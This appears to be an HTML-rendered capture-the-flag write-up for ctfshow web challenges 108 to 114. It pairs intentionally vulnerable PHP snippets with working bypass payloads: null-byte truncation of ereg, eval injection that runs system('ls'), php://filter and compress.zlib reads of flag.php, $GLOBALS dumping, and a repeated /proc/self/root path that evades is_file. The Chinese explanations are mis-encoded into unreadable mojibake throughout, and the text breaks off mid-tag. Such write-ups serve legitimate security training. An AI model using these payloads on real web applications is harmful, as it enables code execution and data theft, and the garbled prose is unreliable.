class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡,æ‰€ä»¥å¯ä»¥ä½¿ç”¨%00æˆªæ–­æ­£åˆ™åŒ¹é…</p><p><a href="https://blog.csdn.net/qq_25987491/article/details/79952393" target="_blank" rel="noopener">phpä¸­eregå‡½æ•°çš„æˆªæ–­æ¼æ´</a></p><p><a href="https://www.php.net/strrev" target="_blank" rel="noopener">strrevå‡½æ•°</a>ï¼šåè½¬å­—ç¬¦ä¸²</p><p>0x36d=877ï¼Œå› ä¸ºä¼šè¢«åè½¬æ‰€ä»¥éœ€è¦778æ¥æå‰åè½¬ï¼ŒåŒæ—¶éœ€è¦æˆªæ–­å¤„ç†ï¼Œæ‰€ä»¥<code>c=a%00778</code>ç»è¿‡åè½¬åå–æ•´å°±æ˜¯877</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"echo new $v1($v2());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºåªè¦æœ‰å­—æ¯å°±è¡Œï¼Œæ‰€ä»¥åˆ©ç”¨PHPå·²æœ‰çš„ç±»é—­åˆä¸€ä¸‹(é¢„é˜²æ„å¤–çš„æŠ¥é”™å¯¼è‡´ç¨‹åºæ— æ³•æ­£å¸¸æ‰§è¡Œ)ï¼Œç„¶åæ„é€ å‘½ä»¤æ‰§è¡Œå³å¯ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>v1<span class="token operator">=</span><span class="token function">Exception</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//&amp;v2=a</span><span class="token operator">?</span>v1<span class="token operator">=</span>ReflectionClass<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token operator">?</span>v1<span class="token operator">=</span><span class="token function">ReflectionClass</span><span class="token punctuation">(</span><span class="token string">"PDO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//&amp;v2=a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="http://blog.uiste.com/2015/20151018-1.html" target="_blank" rel="noopener">åå°„ | PDO</a></p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"echo new $v1($v2());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>FilesystemIteratorè·å–ç›®å½•æ–‡ä»¶<a href="http://phpff.com/filesystemiterator" target="_blank" rel="noopener">FilesystemIterator</a></p><p>getcwd()å‡½æ•°å–å¾—å½“å‰å·¥ä½œç›®å½•<a href="https://www.runoob.com/php/func-directory-getcwd.html" target="_blank" rel="noopener">getcwd()å‡½æ•°</a></p><p><strong>æ„é€ playloadï¼š</strong></p><p><code>v1=FilesystemIterator&amp;v2=getcwd</code></p><p>å¾—åˆ°å½“å‰ç›®å½•çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åå­—ï¼šfl36dga.txtï¼Œç„¶åè®¿é—®å³å¯ï¼Œç¼ºé™·ï¼šåªèƒ½è·å–ç¬¬ä¸€ä¸ªæ–‡ä»¶åå­—</p><p><strong>æœ¬åœ°è¯•éªŒä¾‹å­</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">// $iterator = new FilesystemIterator(getcwd());</span> <span class="token comment" spellcheck="true">// //è®¡ç®—è¿­ä»£å™¨ä¸­å…ƒç´ çš„ä¸ªæ•°</span> <span class="token comment" spellcheck="true">// printf("There were %d Files", iterator_count($iterator));</span> <span class="token comment" spellcheck="true">//php FilesystemIterator ä½¿ç”¨ seek æ”¹å˜æŒ‡é’ˆä½ç½®</span> <span class="token variable">$iterator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token string">"../ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//php FilesystemIterator ä½¿ç”¨ seek æ”¹å˜æŒ‡é’ˆä½ç½®</span> <span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//ä½¿ç”¨valid()éªŒè¯æ˜¯å¦å­˜åœ¨</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//è·å–å½“å‰æŒ‡é’ˆçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å</span>     <span class="token keyword">echo</span> <span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">'No file at position 3'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//è¦éå†å½“å‰æŒ‡é’ˆä»¥åçš„æ‰€æœ‰æ–‡ä»¶å¿…é¡»ä½¿ç”¨while valid()å’Œnext()æ–¹æ³•ï¼Œå¦‚æœä½¿ç”¨foreachå°†ä¼šéå†å‡ºæ‰€æœ‰çš„æ•°æ®</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//å¿…é¡»è¦ç”¨nextæ–¹æ³•æ”¹å˜æŒ‡é’ˆä½ç½®</span>     <span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//php FilesystemIterator ä½¿ç”¨ valid next æ–¹æ³•éå†å…ƒç´ </span> <span class="token comment" spellcheck="true">// $iterator = new FilesystemIterator("../ctfshow");</span> <span class="token comment" spellcheck="true">// while($iterator->valid()) {</span> <span class="token comment" spellcheck="true">//     var_dump($iterator->getFilename()) . "\n";</span> <span class="token comment" spellcheck="true">//     //å¿…é¡»è¦ç”¨nextæ–¹æ³•æ”¹å˜æŒ‡é’ˆä½ç½®</span> <span class="token comment" spellcheck="true">//     $iterator->next();</span> <span class="token comment" spellcheck="true">// }</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$$v1 = &amp;$$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span>$<span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//è§„å®šv1çš„å€¼</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨å…¨å±€å˜é‡æ¥å®ç°è¾“å‡º</p><p>v1=ctfshow</p><p>v2=GLOBALS</p><p>$ctfshow=&amp;$GLOBALSæ­¤æ—¶$ctfshowçš„æŒ‡å‘å°±æ˜¯å…¨å±€å˜é‡çš„æŒ‡å‘ï¼Œäºå…¶å…·æœ‰äº†ç›¸åŒçš„ä½œç”¨ï¼Œé‚£ä¹ˆæ­¤æ—¶var_dump($ctfshow)å°±æ˜¯var_dump($GLOBALS)</p><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“çœ‹åˆ°inputå’Œrot13å’Œbase64çš„æ—¶å€™å°±èƒ½æƒ³åˆ°åˆ©ç”¨çš„æ˜¯ä¼ªåè®®ï¼Œå¹¶ä¸”è€ƒç‚¹æ˜¯å¤šç§è¯»å–æ–¹å¼</p><pre class="line-numbers language-php"><code class="language-php">å¯ä»¥ç›´æ¥ç”¨ä¸å¸¦ä»»ä½•è¿‡æ»¤å™¨çš„filterä¼ªåè®®file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/resource=flag.php</span>ä¹Ÿå¯ä»¥ç”¨ä¸€äº›æ²¡æœ‰è¿‡æ»¤æ‰çš„ç¼–ç æ–¹å¼å’Œè½¬æ¢æ–¹å¼file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.quoted-printable-encode/resource=flag.php</span>file<span class="token operator">=</span>compress<span class="token punctuation">.</span>zlib<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//flag.php</span>â†‘è¿™æ˜¯è¯»å–å‹ç¼©æµfile<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span>â†‘è¿™æ˜¯ä¸¤ä½ä¸€åè½¬çš„è¯»å–æ–¹å¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨ä¸Šä¸€é“é¢˜ç›®çš„payloadå¯ä»¥ç»§ç»­æ‰“</p><p><code>file=compress.zlib://flag.php</code></p><p>linuxé‡Œ<code>/proc/self/root</code>æ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥<code>ls /proc/self/root</code>ï¼Œå…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹<br>å¤šæ¬¡é‡å¤åç»•è¿‡<code>is_file</code>ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>flag<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è‡³äºä¸ºä»€ä¹ˆéœ€è¦å¤šæ¬¡é‡å¤æ¥ç»•è¿‡ï¼Œå¯èƒ½æ˜¯is_filrå‡½æ•°çš„ç‰¹è‰²å§</p><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span 